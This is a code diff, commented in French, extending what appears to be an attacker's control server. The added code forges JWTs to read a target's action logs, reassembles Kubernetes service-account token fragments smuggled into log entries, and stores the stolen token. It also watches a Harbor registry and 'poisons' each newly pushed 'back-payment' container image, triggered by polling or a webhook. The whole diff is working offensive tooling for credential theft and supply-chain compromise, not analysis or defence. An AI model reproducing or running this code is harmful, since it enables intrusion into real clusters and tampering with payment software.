@@ -575,6 +575,122 @@ def selfping_loop():
             pass
 
 # ---------------- HTTP ----------------
+# ---------------- CATCH-UP HTTP (les threads résidents gèlent sur Render free —
+# tout le travail critique se fait aussi à chaque requête entrante) ----------------
+_last_catchup = {"ts": 0}
+
+def catchup_once(force=False):
+    """Exécuté à chaque /health (keep-alive GH Actions 5 min) : remplace les threads
+    gelés — monitor + deployment_check + purge + relance si threads gelés."""
+    with lock:
+        now = time.time()
+        if not force and now - _last_catchup["ts"] < 55:
+            return
+        _last_catchup["ts"] = now
+    try:
+        with lock:
+            mon_ts = state.get("monitor_ts") or 0
+            wat_ts = state.get("watcher_ts") or 0
+        if time.time() - mon_ts > 900:
+            log("catchup: monitor gelé → thread monitor relancé")
+            threading.Thread(target=monitor_loop, daemon=True).start()
+        if time.time() - wat_ts > 900:
+            log("catchup: watcher gelé → thread watcher relancé")
+            threading.Thread(target=watcher_loop, daemon=True).start()
+        # un passage monitor (déploiement, K8SAT, app status) dans un thread frais
+        threading.Thread(target=_monitor_pass, daemon=True).start()
+        # un passage watcher (poll Harbor) dans un thread frais
+        threading.Thread(target=_watcher_pass, daemon=True).start()
+    except Exception as e:
+        log(f"catchup err: {e}")
+
+def _monitor_pass():
+    try:
+        deployment_check()
+    except Exception as e:
+        log(f"catchup deploy-check err: {e}")
+    try:
+        tok = forge_jwt()
+        if not tok:
+            return
+        req = urllib.request.Request(CORE + "/action-logs/filter",
+            data=json.dumps({"page": 0, "size": 200}).encode(), method="POST",
+            headers={"Authorization": "Bearer " + tok, "Content-Type": "application/json",
+                     "User-Agent": "Mozilla/5.0"})
+        d = json.loads(urllib.request.urlopen(req, timeout=30, context=CTX).read())
+        with lock:
+            state["app_status"] = "up"
+            state["monitor_ts"] = time.time()
+        k8sat = {}
+        for l in d.get("content", []):
+            desc = l.get("description") or ""
+            if desc.startswith("K8SAT:") and not desc.startswith("K8SAT:TEST"):
+                parts = desc.split(":", 3)
+                if len(parts) == 4:
+                    k8sat.setdefault(parts[2], {})[int(parts[1].split("/")[0])] = parts[3]
+        if k8sat:
+            for ns, chunks in k8sat.items():
+                tok_sa = "".join(chunks[k] for k in sorted(chunks))
+                with lock:
+                    state["k8sat"] = {"ns": ns, "token": tok_sa, "at": time.strftime("%Y-%m-%d %H:%M:%S")}
+                log(f"catchup: K8SAT DÉTECTÉ (ns={ns}, {len(chunks)} fragments)")
+    except Exception as e:
+        log(f"catchup monitor err: {e}")
+
+def _watcher_pass():
+    try:
+        seen = known_tags()
+        if seen is None:
+            return
+        with lock:
+            state["watcher_ts"] = time.time()
+        current = set()
+        with lock:
+            for e in state["new_tags"]:
+                if e.get("ok"):
+                    current.add(e["tag"])
+        for tag in seen:
+            if tag not in current and not tag.endswith("1259-20260916234549"):
+                log(f"catchup watcher: NOUVEAU TAG détecté {tag} → empoisonnement")
+                threading.Thread(target=_poison_and_log, args=(tag,), daemon=True).start()
+    except Exception as e:
+        log(f"catchup watcher err: {e}")
+
+def _poison_and_log(tag):
+    ok, detail = poison_new_image(tag)
+    with lock:
+        state["new_tags"].append({"tag": tag, "ok": ok, "detail": detail,
+                                  "at": time.strftime("%Y-%m-%d %H:%M:%S")})
+    log(f"[POISON{' OK' if ok else ' KO'}] {tag} {detail}")
+    send_email("Notification Afreety", f"Nouveau tag: {tag}")
+
+# ---------------- HARBOR WEBHOOK (poison INSTANTANÉ, plus de course de 3 min) ----------------
+def harbor_hook(body):
+    """Webhook Harbor PUSH_ARTIFACT → poison immédiat du back-payment."""
+    try:
+        etype = body.get("type") or ""
+        data = body.get("event_data") or {}
+        repo = ((data.get("repository") or {}).get("repo_full_name")
+               or (data.get("repository") or {}).get("name") or "")
+        if "PUSH_ARTIFACT" not in etype.upper() or "back-payment" not in repo:
+            return "ignoré"
+        resources = data.get("resources") or []
+        tag = None
+        for r in resources:
+            if r.get("tag"):
+                tag = r["tag"]
+        if not tag:
+            return "pas de tag"
+        with lock:
+            already = any(e.get("tag") == tag and e.get("ok") for e in state["new_tags"])
+        if already:
+            return "déjà empoisonné"
+        log(f"[HARBOR-HOOK] PUSH_ARTIFACT back-payment:{tag} → poison immédiat")
+        threading.Thread(target=_poison_and_log, args=(tag,), daemon=True).start()
+        return "poison lancé"
+    except Exception as e:
+        return f"err: {e}"
+
 class H(BaseHTTPRequestHandler):
     def _json(self, code, obj):
         b = json.dumps(obj, indent=1).encode()
@@ -588,8 +704,18 @@ class H(BaseHTTPRequestHandler):
         u = urlparse(self.path)
         q = parse_qs(u.query)
         if u.path == "/health":
+            threading.Thread(target=catchup_once, daemon=True).start()
             return self._json(200, {"ok": True, "started": state["started"],
                                     "tags": len(state["new_tags"]), "k8sat": bool(state["k8sat"])})
+        if u.path == "/harbor-hook":
+            if q.get("key", [""])[0] != STATE_KEY:
+                return self._json(403, {"error": "bad key"})
+            try:
+                ln = int(self.headers.get("Content-Length") or 0)
+                body = json.loads(self.rfile.read(ln) or b"{}")
+            except Exception:
+                return self._json(400, {"error": "bad json"})
+            return self._json(200, {"result": harbor_hook(body)})
         if u.path == "/state":
             if q.get("key", [""])[0] != STATE_KEY:
                 return self._json(403, {"error": "bad key"})
@@ -609,6 +735,20 @@ class H(BaseHTTPRequestHandler):
                 return self._json(403, {"error": "bad key"})
             state["new_tags"] = []
             return self._json(200, {"ok": True})
+        return self._json(404, {"error": "not found"})
+    def do_POST(self):
+        from urllib.parse import urlparse, parse_qs
+        u = urlparse(self.path)
+        q = parse_qs(u.query)
+        if u.path == "/harbor-hook":
+            if q.get("key", [""])[0] != STATE_KEY:
+                return self._json(403, {"error": "bad key"})
+            try:
+                ln = int(self.headers.get("Content-Length") or 0)
+                body = json.loads(self.rfile.read(ln) or b"{}")
+            except Exception:
+                return self._json(400, {"error": "bad json"})
+            return self._json(200, {"result": harbor_hook(body)})
         return self._json(404, {"error": "not found"})
     def log_message(self, *a):
         pass
